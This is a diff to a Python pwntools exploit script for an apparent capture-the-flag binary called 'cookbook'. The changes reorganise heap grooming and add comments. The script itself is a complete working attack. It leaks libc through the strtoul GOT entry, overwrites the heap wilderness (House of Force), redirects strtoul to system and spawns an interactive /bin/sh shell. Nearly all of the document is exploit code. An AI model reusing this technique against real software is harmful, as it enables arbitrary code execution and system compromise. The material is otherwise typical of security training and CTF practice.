@@ -8,7 +8,6 @@ import re
 import ctypes
 
 r = process('./cookbook')
-
 b = ELF('./cookbook')
 libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
@@ -28,12 +27,7 @@ def fill_heap(nr):
         s(hex(0x5))
         s(p32(0xdeadbeef))
 
-def add_leak(addr, groom=0x200):
-    if groom > 0:
-        fill_heap(groom)
-    else:
-        print 'do not fill heap....'
-
+def add_leak(addr):
     s('c')
     s('n') # calloc(1, 0x40c)
     s('d') # free()
@@ -76,6 +70,10 @@ if __name__ == "__main__":
     r.recvuntil("what's your name?")
     s('babo')
 
+    #
+    # stabilize heap
+    #
+
     ei('water')
     ei('tomato')
     ei('basil')
@@ -85,9 +83,12 @@ if __name__ == "__main__":
     ei('corn')
     ei('olive oil')
     
+    fill_heap(0x200)
+
     #
     # calc LIBC_BASE
     #
+
     add_leak(STRTOUL_GOT)
     leaked = parse_ingredient()
     LIBC_BASE = leaked - STRTOUL_OFFSET
@@ -102,21 +103,21 @@ if __name__ == "__main__":
     s('n')
     s('d')
     s('q')
-    add_leak(0x804d0a0, groom = 0)
+    add_leak(0x804d0a0)
     leaked = parse_ingredient()
 
     log.info("CURRENT_RECIPE: 0x%x" % leaked)
 
     raw_input('after leaking 0x804d0a0...\n')
 
-    START_A = leaked + 0x134
+    FGETS_BUF = leaked + 0x134
     HEAP_WILDERNESS = leaked + 0x4b4
     log.info("HEAP_WILDERNESS: 0x%x" % HEAP_WILDERNESS)
 
     s('c')
     s('n') # calloc(1, 0x40c)
     s('g')
-    s('A' * (HEAP_WILDERNESS-START_A) + p32(0xffffffff))
+    s('A' * (HEAP_WILDERNESS-FGETS_BUF) + p32(0xffffffff))
     s('q')
 
     raw_input('after overwriting heap wilderness...\n')
@@ -131,23 +132,19 @@ if __name__ == "__main__":
     log.info('system: 0x%x' % (LIBC_BASE + SYSTEM_OFFSET))
 
     s('g')
-    s(hex(MAGIC_MALLOC))
+    s(hex(MAGIC_MALLOC)) # alloc large amounts of memory, and next malloc will be...
     s('X')
 
     s('g')
-    s('0x5')
+    s('0x5') # this malloc will be overlap with strtoul@got
     s(p32(LIBC_BASE+SYSTEM_OFFSET))
 
-    s('g')
-    s('/bin/sh\x00')
-
-    r.clean()
-    r.interactive()
     #
     # strtoul("/bin/sh")
     #
+
     s('g')
     s('/bin/sh\x00')
-    
+
     r.clean()
     r.interactive()
